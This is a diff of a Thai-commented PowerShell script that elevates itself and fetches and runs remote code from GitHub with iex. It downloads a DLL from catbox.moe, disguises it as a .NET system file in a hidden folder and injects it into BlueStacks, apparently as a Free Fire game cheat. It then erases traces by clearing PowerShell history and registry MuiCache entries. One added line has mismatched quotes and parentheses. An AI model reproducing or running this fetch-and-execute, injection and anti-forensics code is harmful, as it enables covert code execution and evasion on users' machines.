@@ -1,40 +1,26 @@
-# 1. ขอสิทธิ์ Administrator (จำเป็นสำหรับการจัดการ Memory ของโปรเซสอื่น)
+# 1. ขอสิทธิ์ Administrator (จำเป็นมากสำหรับการ Inject)
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $myPath = $MyInvocation.MyCommand.Definition
-    if ($myPath) {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$myPath`"" -Verb RunAs
-    } else {
-        # กรณี Copy-Paste ลง Console ตรงๆ
-        $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((iwr 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1' -UseBasicParsing).Content)"
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
-    }
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex (irm https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1)' -UseBasicParsing).Content)`"" -Verb RunAs
     exit
 }
 
 # 2. ตั้งค่าไฟล์และการพรางตัว
-$url = "https://files.catbox.moe/0ukxya.dll" 
-$fakeName = "mscories.dll" 
+$url = "https://files.catbox.moe/0ukxya.dll" # ลิงก์ไฟล์ DLL ของคุณ
+$fakeName = "mscories.dll" # ปลอมชื่อให้เหมือนไฟล์ระบบ .NET
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
-$targetProcess = "HD-Player" 
-$blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+$targetProcess = "HD-Player" # ชื่อโปรเซส BlueStacks โดยไม่ต้องมี .exe
 
-# 3. เตรียมที่เก็บไฟล์แบบพรางตัว
+# 3. เตรียมที่เก็บไฟล์
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
 # 4. ดาวน์โหลด DLL
-Write-Host "[*] Downloading components..." -ForegroundColor Cyan
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ProgressPreference = 'SilentlyContinue'
-try {
-    Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
-} catch {
-    Write-Host "[!] Download failed." -ForegroundColor Red; exit
-}
+Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing
 
-# 5. C# Code สำหรับ Manual Injection (Win32 API)
+# 5. ฟังก์ชันสำหรับ Inject DLL เข้าไปใน BlueStacks (C# Method)
 $Source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -66,48 +52,36 @@ public class Injector {
 }
 "@
 
-# 6. เริ่มกระบวนการ Inject
+# 6. เริ่มการรัน BlueStacks และ Inject
 if (Test-Path $dllPath) {
-    Write-Host "[*] Checking for $targetProcess..." -ForegroundColor Cyan
-    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
-    
+    # ตรวจสอบว่า BlueStacks เปิดอยู่ไหม ถ้าไม่เปิดให้เปิดก่อน
+    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     if (!$proc) {
-        Write-Host "[*] Launching BlueStacks..." -ForegroundColor Yellow
-        Start-Process $blueStacksPath
-        Start-Sleep -Seconds 10 # รอให้โปรแกรมโหลดเข้า Memory
-        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue | Select-Object -First 1
+        Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
+        Start-Sleep -Seconds 5 # รอให้โปรเซสขึ้น
+        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     }
 
     if ($proc) {
-        Write-Host "[+] Injecting into PID: $($proc.Id)..." -ForegroundColor Green
-        try {
-            Add-Type -TypeDefinition $Source
-            [Injector]::Inject($proc.Id, $dllPath)
-            Write-Host "[+] Injection successful." -ForegroundColor Green
-        } catch {
-            Write-Host "[!] Injection failed: $_" -ForegroundColor Red
-        }
+        # ทำการ Inject DLL เข้าไป
+        Add-Type -TypeDefinition $Source
+        [Injector]::Inject($proc.Id, $dllPath)
     }
 }
 
-# 7. --- การลบร่องรอย (The Ghost Clean - No Explorer Restart) ---
-Write-Host "[*] Cleaning up traces..." -ForegroundColor Gray
-Start-Sleep -Seconds 3
-
-# ลบไฟล์ DLL (ระวัง: ถ้า DLL กำลังถูกใช้งานอยู่ อาจลบไม่ได้ทันทีจนกว่าจะปิดเกม)
+# 7. --- ลบร่องรอย (The Ghost Clean) ---
+Start-Sleep -Seconds 5
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-
-# ล้างประวัติ PowerShell
 $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) { Clear-Content -Path $historyPath -Force }
 Clear-History
 
-# ล้างค่าใน Registry (MuiCache) โดยไม่รีสตาร์ทเครื่อง
+# ล้าง Registry MuiCache และ UserAssist เหมือนเดิม
 $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-if (Test-Path $muiPath) {
-    Get-Item -Path $muiPath | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
-        Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
-    }
+Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
+    Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "[+] Done. System is ready." -ForegroundColor Green
+# รีสตาร์ท Explorer เพื่อความเนียน
+Stop-Process -Name Explorer -Force -ErrorAction SilentlyContinue
+Start-Process Explorer -WindowStyle Hidden
